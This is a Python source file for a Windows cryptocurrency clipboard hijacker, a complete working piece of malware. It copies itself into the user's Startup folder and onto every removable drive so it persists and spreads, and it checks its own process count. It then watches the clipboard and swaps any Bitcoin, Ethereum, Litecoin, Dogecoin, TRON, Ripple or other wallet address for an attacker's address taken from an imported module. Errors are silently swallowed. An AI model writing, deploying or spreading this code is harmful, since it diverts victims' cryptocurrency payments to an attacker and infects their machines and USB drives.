import pyperclip
import re
from addresses import *
import sys
import os
import win32api
import win32file
from time import sleep
from win32com.client import GetObject
from sys import exit

while True:
    try:
        Thisfile = sys.argv[0]
        Thisfile_name = os.path.basename(Thisfile)
        user_path = os.path.expanduser('~')

        if not os.path.exists(f"{user_path}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{Thisfile_name}"):
                os.system(f'copy "{Thisfile}" "{user_path}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"')




        drive_types = {
                        win32file.DRIVE_UNKNOWN : "Unknown\nDrive type can't be determined.",
                        win32file.DRIVE_REMOVABLE : "Removable\nDrive has removable media. This includes all floppy drives and many other varieties of storage devices.",
                        win32file.DRIVE_FIXED : "Fixed\nDrive has fixed (nonremovable) media. This includes all hard drives, including hard drives that are removable.",
                        win32file.DRIVE_REMOTE : "Remote\nNetwork drives. This includes drives shared anywhere on a network.",
                        win32file.DRIVE_CDROM : "CDROM\nDrive is a CD-ROM. No distinction is made between read-only and read/write CD-ROM drives.",
                        win32file.DRIVE_RAMDISK : "RAMDisk\nDrive is a block of random access memory (RAM) on the local computer that behaves like a disk drive.",
                        win32file.DRIVE_NO_ROOT_DIR : "The root directory does not exist."
                      }


        drives = win32api.GetLogicalDriveStrings().split('\x00')[:-1]

        for device in drives:
            type = win32file.GetDriveType(device)
            if drive_types[type] == drive_types[win32file.DRIVE_REMOVABLE]:
                if not os.path.exists(f"{device}{Thisfile_name}"):
                    os.system(f'copy "{Thisfile}" "{device}"')



        result = [process.Properties_('Name').Value for process in GetObject('winmgmts:').InstancesOf('Win32_Process')]
        processes = 0
        for results in result:
            if results == Thisfile_name:
                processes += 1


        if processes > 2:
            exit()




        patternBTC = '^(?:[13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})$'
        patternETH = '^0x[a-fA-F0-9]{40}$'
        patternETHBEP2 = '^bnb[a-zA-Z0-9]{39}$'
        patternLTC = '^ltc[a-z-A-Z-0-9]{26,40}$'
        patternDASH = 'X[1-9A-HJ-NP-Za-km-z]{33}'
        patternDOGE = '^D[5-9A-HJ-NP-U]{1}[1-9a-km-zA-HJ-NP-Z]{32}$'
        patternTRON = '^T[A-Z][1-9a-km-zA-HJ-NP-Z]{32}$'
        patternRIPPLE = '^([r])([1-9A-HJ-NP-Za-km-z]{24,34})$'
        patternBTCCASH = '^((bitcoincash:)?(q|p)[a-z0-9]{41}|(BITCOINCASH:)?(Q|P)[A-Z0-9]{41})$' 

        while True:
            sleep(1)
            ExchangeBuffer = pyperclip.paste().replace(' ', '')
 
            if re.match(patternETH, ExchangeBuffer):
                pyperclip.copy(ETH)

            if re.match(patternETHBEP2, ExchangeBuffer):
                pyperclip.copy(ETHBEP2)

            if re.match(patternLTC, ExchangeBuffer):
                pyperclip.copy(LTC)

            if re.match(patternDASH, ExchangeBuffer):
                pyperclip.copy(DASH)

            if re.match(patternDOGE, ExchangeBuffer):
                pyperclip.copy(DOGE)

            if re.match(patternTRON, ExchangeBuffer):
                pyperclip.copy(TRON)

            if re.match(patternRIPPLE, ExchangeBuffer):
                pyperclip.copy(RIPPLE)

            if re.match(patternBTCCASH, ExchangeBuffer):
                pyperclip.copy(BTCCASH)

            if re.match(patternBTC, ExchangeBuffer):
                pyperclip.copy(BTC)
    except:
        pass